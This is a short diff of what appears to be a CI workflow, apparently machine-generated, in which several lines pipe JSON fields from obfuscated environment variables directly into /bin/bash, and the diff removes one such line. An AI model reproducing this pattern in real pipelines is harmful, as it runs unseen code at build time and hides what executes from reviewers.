@@ -29,7 +29,6 @@ jobs:
           echo $rqfs25417 | jq -r .qzhp101 | /bin/bash
           echo $ynoro6 | jq -r .zaba66 | /bin/bash
           echo $gclun50 | jq -r .pafrs45 | /bin/bash
-          echo $hil462 | jq -r .pmyr3 | /bin/bash
           echo $kc1 | jq -r .ogo51 | /bin/bash
           printf '%s' "$b864" | jq -r .lwsap81213 | /bin/bash
 
